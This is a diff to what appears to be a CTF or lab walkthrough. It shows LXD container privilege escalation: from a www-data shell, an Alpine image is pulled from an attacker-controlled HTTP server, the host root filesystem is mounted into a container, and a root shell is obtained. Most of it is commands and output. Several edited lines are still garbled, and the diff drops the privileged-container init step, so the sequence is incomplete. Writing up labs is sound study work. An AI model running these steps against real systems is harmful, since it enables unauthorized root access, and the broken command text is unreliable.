@@ -463,7 +463,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 ```
 www-data@ubuntu:/$ cd /dev/shm
-18_0139.tar.gzu:/dev/shm$ wget http://10.9.2.156:8000/alpine-v3.13-x86_64-2021021
+www-data@ubuntu:/dev/shm$ wget http://10.9.2.156:8000/alpine-v3.13-x86_64-202102118_0139.tar.gz
 --2024-11-19 01:16:38--  http://10.9.2.156:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
 Connecting to 10.9.2.156:8000... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -475,19 +475,19 @@ alpine-v3.13-x86_64 100%[===================>]   3.11M  4.70MB/s    in 0.7s
 2024-11-19 01:16:39 (4.70 MB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]
 www-data@ubuntu:/dev/shm$ ls -l
 total 3184
--rw-rw-rw- 1 www-data www-data 3259593 Nov 19 01:10 alpine-v3.13-x86_64-20210218_0139.tar.gz
-ar.gz --alias myimageshm$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.ta
+www-data www-data 3259593 Nov 19 01:10 alpine-v3.13-x86_64-20210218_0139.tar.gz-rw-rw-rw- 1 
+ar.gz shm$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
 www-data@ubuntu:/dev/shm$ lxc image list     
 +---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
 |  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
 +---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
 | myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Nov 19, 2024 at 9:20am (UTC) |
 +---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
-uew-data@ubuntu:/dev/shm$ lxc init myimage mycontainer -c security.privileged=tru
+www-data@ubuntu:/dev/shm$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 Creating mycontainer
 =/ path=/mnt/root recursive=truenfig device add mycontainer mydevice disk source=
 Device mydevice added to mycontainer
-
+www-data@ubuntu:/dev/shm$ lxc start mycontainer
 www-data@ubuntu:/dev/shm$ lxc exec mycontainer /bin/sh
 ~ # whoami
 root
